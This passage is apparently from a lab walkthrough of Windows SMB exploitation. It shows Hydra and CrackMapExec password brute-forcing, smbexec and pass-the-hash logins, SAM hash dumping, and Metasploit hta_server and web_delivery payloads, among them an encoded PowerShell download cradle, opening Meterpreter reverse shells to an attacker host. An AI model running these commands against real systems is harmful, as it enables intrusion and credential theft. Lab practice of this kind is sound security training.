Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-20 18:29:02
[WARNING] Workgroup was not specified, using "WORKGROUP"
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking smb2://10.4.28.143:445/
[445][smb2] host: 10.4.28.143   login: sysadmin   password: madison ←
[445][smb2] host: 10.4.28.143   login: demo   password: patrick
[445][smb2] host: 10.4.28.143   login: auditor   password: estrella
[445][smb2] host: 10.4.28.143   login: administrator   password: carolina ←
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-20 18:29:17
```

_Use `smbexec.py` to execute commands on the target machine using the compromised credentials. First, attempt to execute as `sysadmin`, then retry as `administrator` if access is denied._

`smbexec.py sysadmin:madison@10.4.28.143`:
```
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied ←
```

**Explanation:** The `rpc_s_access_denied` error indicates that the `sysadmin` account does not have sufficient privileges to execute the desired actions on the target machine.

_Retry the command using the `administrator` credentials._

`smbexec.py administrator:carolina@10.4.28.143`:
```
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute ←
```

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Confirm that the shell has escalated privileges to `NT AUTHORITY\SYSTEM`, indicating that the exploitation was successful._

`whoami`:
```
nt authority\system ←
```

_Validate the current user’s group memberships to ensure that the `administrator` account is part of the Administrators group on the target machine._

`net localgroup Administrators`:
```
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator ←
The command completed successfully.
```

<span style="color: #e57373;">**Attacker machine**</span>.

_Check the network configuration on the attacker machine to set up the Metasploit listener on the correct interface (here, `eth1`)._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.3  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:03  txqueuelen 0  (Ethernet)
        RX packets 12147  bytes 936881 (914.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11210  bytes 3954577 (3.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.50.5  netmask 255.255.255.0  broadcast 10.10.50.255 ←
        ether 02:42:0a:0a:32:05  txqueuelen 0  (Ethernet)
        RX packets 95736  bytes 9548154 (9.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 100010  bytes 11193002 (10.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 53214  bytes 120530101 (114.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 53214  bytes 120530101 (114.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Use Metasploit to set up a listener and deliver a Meterpreter payload to the target machine. Begin by launching the Metasploit console and configuring the payload and listener settings._

`msfconsole -q`

`search hta_server`, `use exploit/windows/misc/hta_server`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.50.5`, `set LPORT 4444`, `exploit`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.50.5:4444 ← 
[*] Using URL: http://0.0.0.0:8080/erkRK2mE.hta
[*] Local IP: http://10.10.50.5:8080/erkRK2mE.hta ←
[*] Server started.
```

**Explanation**: The Metasploit `hta_server` module generates a malicious HTA (HTML Application) file that, when executed on the target, delivers a payload to open a Meterpreter session.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_On the target machine, execute the malicious HTA file hosted by the Metasploit listener to establish a Meterpreter session back to the attacker's machine._

`mshta.exe http://10.10.50.5:8080/erkRK2mE.hta`

<span style="color: #e57373;">**Attacker machine**</span>.

_Verify that the Meterpreter session has been successfully established, confirming control over the target machine._

```
[*] 10.4.28.143      hta_server - Delivering Payload
[*] Sending stage (176195 bytes) to 10.4.28.143
[*] Meterpreter session 1 opened (10.10.50.5:4444 -> 10.4.28.143:49783) at 2024-08-20 18:40:12 +0530 ←
```

_List all active sessions in Metasploit and interact with the new Meterpreter session._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Check the user context of the Meterpreter session to confirm that it is running with `NT AUTHORITY\SYSTEM` privileges._

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

_Migrate the Meterpreter process to `lsass.exe` to ensure persistence and stability of the session by attaching to a critical system process._

`migrate -N lsass.exe`:
```
[*] Migrating from 2824 to 552...
[*] Migration completed successfully. ←
```

_Use the shell command to search for files with the keyword `flag` and retrieve the contents to obtain the flag for the lab._

`shell`, `where /r C:\ ""*flag*"`:
```
C:\flag.txt ←
```

_Read the contents of the flag file to complete the objective._

`type C:\flag.txt`:
```
0903a189cbe112bce4b75bbc7c50357c ←
```

_Extract password hashes from the target machine using the `hashdump` command, which can be used for further lateral movement or post-exploitation activities._

`hashdump`:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:00527325548f776793aabfd5cfe39a78::: ←
auditor:1012:aad3b435b51404eeaad3b435b51404ee:a23d91ad69cb32adbc0195a25a54ba54:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
demo:1013:aad3b435b51404eeaad3b435b51404ee:1f637fde0d3ee5f09474683d312bd5aa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sysadmin:1011:aad3b435b51404eeaad3b435b51404ee:92b668493ab02a17dbb21616e71b2ae2:::
```

**Explanation:** The extracted password hashes provide valuable information that can be used in future attacks or for maintaining persistence on the network.

<span style="color: #e57373;">**Attacker machine**</span>.

_Finally, review the help options for `smbexec.py` to explore additional features and functionalities that might be useful in similar scenarios._

`smbexec.py --help`:
```
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

usage: smbexec.py [-h] [-share SHARE] [-mode {SHARE,SERVER}] [-ts] [-debug] [-codec CODEC] [-dc-ip ip address] [-target-ip ip address]
                  [-port [destination port]] [-service-name service_name] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                  [-keytab KEYTAB]
                  target

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

optional arguments:
  -h, --help            show this help message and exit
  -share SHARE          share where the output will be grabbed from (default C$)
  -mode {SHARE,SERVER}  mode to use (default SHARE, SERVER needs root!)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the
                        target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute
                        smbexec.py again with -codec and the corresponding codec

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target
                        is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of theservice used to trigger the payload

authentication:
  -hashes LMHASH:NTHASH ←
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid
                        credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file
```

_Attempt to use the captured hash to re-execute `smbexec.py` as `administrator`, confirming persistence on the target machine._

`smbexec.py administrator@10.4.28.143 -hashes aad3b435b51404eeaad3b435b51404ee:00527325548f776793aabfd5cfe39a78`:
```
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute ←
```

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Confirm the persistence by checking the user context once again._

`whoami`:
```
nt authority\system ←
```

### Windows Lateral Movement with CrackMapExec - Theory

#### CrackMapExec

CrackMapExec (CME) is a powerful open-source penetration testing tool designed for security professionals and ethical hackers.

It is used to enumerate and assess networks, particularly Windows environments, and has extensive capabilities for network reconnaissance, lateral movement, and remote exploitation.

##### CrackMapExec Use Cases

- **Network Enumeration and Reconnaissance:** CME can scan networks to identify hosts, enumerate shares, and gather other valuable information.

- **Credential Testing and Brute Forcing:** CME can test credentials against network resources, checking for weak or reused passwords. This can help penetration testers identify potential vulnerabilities.

- **Lateral Movement:** Using various techniques, CME can move laterally across a network, exploiting valid credentials, hashes, or Kerberos tickets.

- **Privilege Escalation:** CME can attempt to escalate privileges on remote systems, providing deeper access to resources.

- **Remote Command Execution:** CME can execute commands on remote systems over SMB, WMI, or other protocols, allowing for flexible remote management.

### Windows Lateral Movement with CrackMapExec - Lab

#### Lab Environment

A Kali GUI machine and a target machine running a vulnerable SMB service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (`/root/Desktop/target`). 

Your task is to fingerprint the SMB service using the tools available on the Kali machine and then use the CrackMapExec tool to perform a post-exploitation on the SMB service and extract sensitive information i.e. Windows users hashes, LSA secrets, shared folders information, etc. 

**Objective:** Exploit the SMB service to get a Meterpreter on the target and retrieve the flag!

Dictionaries to use:
- `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Obtain the target machine's IP address from the provided file to perform subsequent operations on the correct target._

`cat /root/Desktop/target`:
```
Target IP Address : 10.4.23.124 ←
```

_Use the `ping` command to check connectivity to the target machine, ensuring that it is reachable and verifying network stability._

`ping -c 3 10.4.23.124`:
```
PING 10.4.23.124 (10.4.23.124) 56(84) bytes of data.
64 bytes from 10.4.23.124: icmp_seq=1 ttl=125 time=9.29 ms
64 bytes from 10.4.23.124: icmp_seq=2 ttl=125 time=8.32 ms
64 bytes from 10.4.23.124: icmp_seq=3 ttl=125 time=8.63 ms

--- 10.4.23.124 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 8.319/8.748/9.294/0.406 ms
```

_Use `nmap` to perform a thorough scan of the target machine, identifying all open ports and services to understand the attack surface._

`nmap -Pn -sS -sV 10.4.23.124 -p-`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-20 19:56 IST
Nmap scan report for 10.4.23.124
Host is up (0.0082s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn ←
445/tcp   open  microsoft-ds? ←
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.10 seconds
```

_Refine the focus to the SMB service running on port 445 by enumerating supported SMB dialects to assist in selecting the correct exploitation technique._

`nmap --script smb-protocols 10.4.23.124 -p 445`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-20 19:55 IST
Nmap scan report for 10.4.23.124
Host is up (0.0089s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: ←
|   dialects: 
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds
```

_Review the CrackMapExec help menu to understand its usage and available options, particularly focusing on SMB-related commands._

`crackmapexec --help`:
```
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell] [--verbose] {ssh,mssql,winrm,smb} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 5.0.2dev
                                                     Codename: P3l1as

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {ssh,mssql,winrm,smb}
    ssh                 own stuff using SSH
    mssql               own stuff using MSSQL
    winrm               own stuff using WINRM
    smb                 own stuff using SMB ←

Ya feelin' a bit buggy all of a sudden?
```

_Enumerate specific options for SMB-related commands to better understand how to leverage CrackMapExec against the SMB service._

`crackmapexec smb --help`:
```
usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--aesKey] [--kdcHost]
                        [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]]
                        [-L] [--options] [--server {http,https}] [--server-host HOST] [--server-port PORT] [-H HASH [HASH ...]]
                        [--no-bruteforce] [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE] [--gen-relay-list OUTPUT_FILE]
                        [--continue-on-success] [--sam | --lsa | --ntds [{vss,drsuapi}]] [--shares] [--sessions] [--disks] [--loggedon-users]
                        [--users [USER]] [--groups [GROUP]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY]
                        [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
                        [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files] [--put-file FILE FILE]
                        [--get-file FILE FILE] [--exec-method {mmcexec,atexec,smbexec,wmiexec}] [--force-ps32] [--no-output]
                        [-x COMMAND | -X PS_COMMAND] [--obfs] [--clear-obfscripts]
                        [target [target ...]]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus
                        file(s)

optional arguments:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)
  --aesKey              AES key to use for Kerberos Authentication (128 or 256 bits)
  --kdcHost             IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  --gfail-limit LIMIT   max number of global failed login attempts
  --ufail-limit LIMIT   max number of failed login attempts per username
  --fail-limit LIMIT    max number of failed login attempts per host
  -M MODULE, --module MODULE
                        module to use
  -o MODULE_OPTION [MODULE_OPTION ...]
                        module options
  -L, --list-modules    list available modules ←
  --options             display module options ←
  --server {http,https}
                        use the selected server (default: https)
  --server-host HOST    IP to bind the server to (default: 0.0.0.0)
  --server-port PORT    start the server on the specified port
  -H HASH [HASH ...], --hash HASH [HASH ...]
                        NTLM hash(es) or file(s) containing NTLM hashes ←
  --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2
  -d DOMAIN             domain to authenticate to
  --local-auth          authenticate locally to each target ←
  --port {139,445}      SMB port (default: 445)
  --share SHARE         specify a share (default: C$)
  --gen-relay-list OUTPUT_FILE
                        outputs all hosts that don't require SMB signing to the specified file
  --continue-on-success
                        continues authentication attempts even after successes

Credential Gathering:
  Options for gathering credentials

  --sam                 dump SAM hashes from target systems ←
  --lsa                 dump LSA secrets from target systems
  --ntds [{vss,drsuapi}]
                        dump the NTDS.dit from target DCs using the specifed method (default: drsuapi)

Mapping/Enumeration:
  Options for Mapping/Enumerating

  --shares              enumerate shares and access ←
  --sessions            enumerate active sessions
  --disks               enumerate disks
  --loggedon-users      enumerate logged on users
  --users [USER]        enumerate domain users, if a user is specified than only its information is queried.
  --groups [GROUP]      enumerate domain groups, if a group is specified than its members are enumerated
  --local-groups [GROUP]
                        enumerate local groups, if a group is specified than its members are enumerated
  --pass-pol            dump password policy
  --rid-brute [MAX_RID]
                        enumerate users by bruteforcing RID's (default: 4000)
  --wmi QUERY           issues the specified WMI query
  --wmi-namespace NAMESPACE
                        WMI Namespace (default: root\cimv2)

Spidering:
  Options for spidering shares

  --spider SHARE        share to spider
  --spider-folder FOLDER
                        folder to spider (default: root share directory)
  --content             enable file content searching
  --exclude-dirs DIR_LIST
                        directories to exclude from spidering
  --pattern PATTERN [PATTERN ...]
                        pattern(s) to search for in folders, filenames and file content
  --regex REGEX [REGEX ...]
                        regex(s) to search for in folders, filenames and file content
  --depth DEPTH         max spider recursion depth (default: infinity & beyond)
  --only-files          only spider files

Files:
  Options for put and get remote files

  --put-file FILE FILE  Put a local file into remote target, ex: whoami.txt \\Windows\\Temp\\whoami.txt
  --get-file FILE FILE  Get a remote file, ex: \\Windows\\Temp\\whoami.txt whoami.txt

Command Execution:
  Options for executing commands

  --exec-method {mmcexec,atexec,smbexec,wmiexec}
                        method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
  --force-ps32          force the PowerShell command to run in a 32-bit process
  --no-output           do not retrieve command output
  -x COMMAND            execute the specified command ←
  -X PS_COMMAND         execute the specified PowerShell command ←

Powershell Obfuscation:
  Options for PowerShell script obfuscation

  --obfs                Obfuscate PowerShell scripts
  --clear-obfscripts    Clear all cached obfuscated PowerShell scripts
```

_Use CrackMapExec to attempt brute-force attacks on the SMB service using common credentials to gain access to the target machine._

`crackmapexec smb 10.4.23.124 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt --local-auth`:
```
SMB         10.4.23.124     445    EC2AMAZ-408S766  [*] Windows 10.0 Build 14393 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:admin STATUS_LOGON_FAILURE 
SMB         10.4.23.124     445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:123456 STATUS_LOGON_FAILURE 
SMB         10.4.23.124     445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:12345 STATUS_LOGON_FAILURE 

...

SMB         10.4.23.124     445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:scooby STATUS_LOGON_FAILURE 
SMB         10.4.23.124     445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:carmen STATUS_LOGON_FAILURE 
SMB         10.4.23.124     445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:456789 STATUS_LOGON_FAILURE 
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!) ←
```

_Verify successful authentication by executing a simple command, such as `whoami`, to confirm the obtained privileges._

`crackmapexec smb 10.4.23.124 -u administrator -p 'sebastian' --local-auth -x 'whoami'`:
```
SMB         10.4.23.124     445    EC2AMAZ-408S766  [*] Windows 10.0 Build 14393 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] Executed command 
SMB         10.4.23.124     445    EC2AMAZ-408S766  ec2amaz-408s766\administrator ←
```

_Dump SAM hashes to retrieve user password hashes from the target machine._

`crackmapexec smb 10.4.23.124 -u administrator -p 'sebastian' --local-auth --sam`:
```
SMB         10.4.23.124     445    EC2AMAZ-408S766  [*] Windows 10.0 Build 14393 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] Dumping SAM hashes
SMB         10.4.23.124     445    EC2AMAZ-408S766  Administrator:500:aad3b435b51404eeaad3b435b51404ee:94ebf4c21e29d139fd332a535626ad6e::: ←
SMB         10.4.23.124     445    EC2AMAZ-408S766  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.4.23.124     445    EC2AMAZ-408S766  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.4.23.124     445    EC2AMAZ-408S766  sysadmin:1011:aad3b435b51404eeaad3b435b51404ee:d6c5976e07cdb410be19b84126367e3d:::
SMB         10.4.23.124     445    EC2AMAZ-408S766  auditor:1012:aad3b435b51404eeaad3b435b51404ee:ba9a038e579c1d0263aedcef043243d9:::
SMB         10.4.23.124     445    EC2AMAZ-408S766  demo:1013:aad3b435b51404eeaad3b435b51404ee:74ed32086b1317b742c3a92148df1019:::
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] Added 6 SAM hashes to the database
```

**Explanation:** Dumping SAM hashes allows you to retrieve hashed credentials for all local users on the machine, which can be cracked or reused in other attacks.

_Use the retrieved NTLM hash to authenticate and execute commands without knowing the plaintext password._

`crackmapexec smb 10.4.23.124 -u administrator -H aad3b435b51404eeaad3b435b51404ee:94ebf4c21e29d139fd332a535626ad6e --local-auth -x 'whoami'`:
```
SMB         10.4.23.124     445    EC2AMAZ-408S766  [*] Windows 10.0 Build 14393 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator aad3b435b51404eeaad3b435b51404ee:94ebf4c21e29d139fd332a535626ad6e (Pwn3d!)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] Executed command 
SMB         10.4.23.124     445    EC2AMAZ-408S766  ec2amaz-408s766\administrator ←
```

**Explanation:** NTLM hashes can be used directly for authentication, enabling you to maintain access even if the plaintext password is unknown or unavailable.

_Enumerate shared folders on the target machine to identify potentially sensitive data._

`crackmapexec smb 10.4.23.124 -u administrator -p 'sebastian' --local-auth --shares`:
```
SMB         10.4.23.124     445    EC2AMAZ-408S766  [*] Windows 10.0 Build 14393 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator aad3b435b51404eeaad3b435b51404ee:94ebf4c21e29d139fd332a535626ad6e (Pwn3d!)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] Enumerated shares
SMB         10.4.23.124     445    EC2AMAZ-408S766  Share           Permissions     Remark
SMB         10.4.23.124     445    EC2AMAZ-408S766  -----           -----------     ------
SMB         10.4.23.124     445    EC2AMAZ-408S766  admin           READ,WRITE      
SMB         10.4.23.124     445    EC2AMAZ-408S766  ADMIN$          READ,WRITE      Remote Admin
SMB         10.4.23.124     445    EC2AMAZ-408S766  C               READ,WRITE      
SMB         10.4.23.124     445    EC2AMAZ-408S766  C$              READ,WRITE      Default share ←
SMB         10.4.23.124     445    EC2AMAZ-408S766  IPC$            READ            Remote IPC ←
SMB         10.4.23.124     445    EC2AMAZ-408S766  public          READ,WRITE     
```

**Explanation:** Shared folder enumeration can reveal accessible directories and files that might contain valuable information or further opportunities for exploitation.

_Check the network configuration on the attacker machine to set up the Metasploit listener on the correct interface (here, `eth1`)._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.5  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:05  txqueuelen 0  (Ethernet)
        RX packets 32832  bytes 2454587 (2.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 35306  bytes 23243196 (22.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.42.2  netmask 255.255.255.0  broadcast 10.10.42.255 ←
        ether 02:42:0a:0a:2a:02  txqueuelen 0  (Ethernet)
        RX packets 67986  bytes 4052554 (3.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 68946  bytes 4317025 (4.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 147482  bytes 1021915228 (974.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 147482  bytes 1021915228 (974.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Set up and configure the Metasploit `web_delivery` module to generate a payload that can be executed on the target machine. The payload will create a Meterpreter session back to the attacker's machine._

`msfconsole -q`

`search web_delivery`, `use exploit/multi/script/web_delivery`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.42.2`, `set LPORT 4444`, `show targets`, `set TARGET PSH`, `exploit`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.42.2:4444 
[*] Using URL: http://0.0.0.0:8080/gmzSnaa5rLqJwSj
[*] Local IP: http://10.10.42.2:8080/gmzSnaa5rLqJwSj
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABGAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZ

...

AGYAVwA5AEwARwBvAGUATAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4ANAAyAC4AMgA6ADgAMAA4ADAALwBnAG0AegBTAG4AYQBhADUAcgBMAHEASgB3AFMAagAnACkAKQA7AA==
```

**Explanation:** The Metasploit `web_delivery` module generates a payload that, when executed on the target, opens a Meterpreter session. This provides a powerful interface for post-exploitation activities.

_Execute the web_delivery payload using CrackMapExec to open a Meterpreter session on the target._

`crackmapexec smb 10.4.23.124 -u administrator -p 'sebastian' --local-auth -M web_delivery --options`:
```
[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named 'pylnk3'
[*] web_delivery module options:

        URL  URL for the download cradle ←
```

`crackmapexec smb 10.4.23.124 -u administrator -p 'sebastian' --local-auth -M web_delivery -o URL=http://10.10.42.2:8080/gmzSnaa5rLqJwSj`:
```
[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named 'pylnk3'
SMB         10.4.23.124     445    EC2AMAZ-408S766  [*] Windows 10.0 Build 14393 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
WEB_DELI... 10.4.23.124     445    EC2AMAZ-408S766  [+] Executed web-delivery launcher ←
```

_Verify that the Meterpreter session has been successfully established, confirming control over the target machine._

```
[*] 10.4.23.124      web_delivery - Delivering Payload (1892 bytes)
